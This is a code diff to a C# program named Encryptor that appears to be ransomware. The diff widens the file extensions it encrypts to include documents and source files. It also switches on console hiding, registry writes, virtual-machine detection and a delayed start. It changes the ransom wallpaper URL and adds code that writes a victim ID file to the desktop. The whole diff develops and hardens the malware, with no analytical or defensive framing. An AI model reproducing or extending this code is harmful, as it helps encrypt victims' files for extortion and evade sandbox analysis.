@@ -27,7 +27,7 @@ namespace Encryptor
 {
 	internal class EncryptorClass
 	{
-		static List<string> targetExtensions = new List<string>(){".txt", ".jpg", ".png", ".pdf", ".mp4", ".mp3",".c",".py"};
+		static List<string> targetExtensions = new List<string>(){".txt", ".jpg", ".png", ".pdf", ".mp4", ".mp3",".c",".py", ".h", ".java",".docx",".pptx"};
 		//String key;
 		static List<string> foldersBlacklist = new List<string>() { "Windows", "Program Files", "Program Files (x86)", ".pdf", ".mp4" };
 		static List<string> toDelete;
@@ -45,11 +45,10 @@ namespace Encryptor
 		
 		public static void Main(string[] args)
 		{
-			//hideConsole();
-			//writeToRegistry();
-			//waitGivenMinutes(MINUTES_TO_WAIT);
-			//checkSysteInfoForVM();
-			
+			hideConsole();
+			writeToRegistry();
+			checkSysteInfoForVM();
+			waitGivenMinutes(MINUTES_TO_WAIT);
 			checkDBStatus();
 
 			AesCryptoServiceProvider aes = createCipher();
@@ -208,9 +207,24 @@ namespace Encryptor
 		private static void notifyUser()
 		{
 			// Change wallpaper
-			Uri wallpaper = new Uri("https://image.ibb.co/cBtOmm/insane_uriel_by_urielstock_3.jpg");
+			Uri wallpaper = new Uri("https://image.ibb.co/kO6xZ6/insane_uriel_by_urielstock_4.jpg");
 			Wallpaper.Set(wallpaper,Wallpaper.Style.Fit);
-			
+			writeIDFile();
+		}
+
+
+		private static void writeIDFile()
+		{
+			string path = @"C:\Users\Daniel Ohayon\Desktop\ID.txt";
+			if (!File.Exists(path)) 
+			{
+				// Create a file to write to.
+				using (StreamWriter sw = File.CreateText(path)) 
+				{
+					sw.WriteLine(DB.GetUUID());
+				}	
+			}
+
 		}
 		
 		
